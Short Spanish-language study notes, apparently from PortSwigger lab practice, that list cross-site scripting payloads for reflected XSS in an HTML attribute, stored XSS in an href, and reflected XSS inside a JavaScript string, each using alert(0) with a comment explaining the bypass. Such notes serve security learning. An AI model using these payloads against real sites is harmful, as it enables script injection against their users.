
# XSS Reflejado y almacenado con codificación HTML

Tags: #XSS #PortSwigger #JavaScript #XSS-Stored #XSS-Reflected 

## XSS reflejado en atributo con corchetes 

```javascript 
// Se evade pero la web encodea el mayor y menor que '><'
	"> <script>alert(0)</script> 

// Cerramos el primer campo con ", despues con la segunda " cerramos la ultima " y se coloca la instrucción de pasar el cursos por encima del campo muestre una ventana emergente 
	" onmouseover="alert(0) 
```

## XSS almacenado en 'href' con comillas modificadas 

```javascript 
	javascript:alert(0)      // Se coloca en el apartado del sitio web 
``` 

## XSS reflejado en string JS con corchetes codificados 

```javascript 
// El input se ejecuta dentro de una función en JS y para que funcione de debe de declarar alguna variable 
	test'; alert(0); var test='probando 
	test'; alert(0); let test='probando
```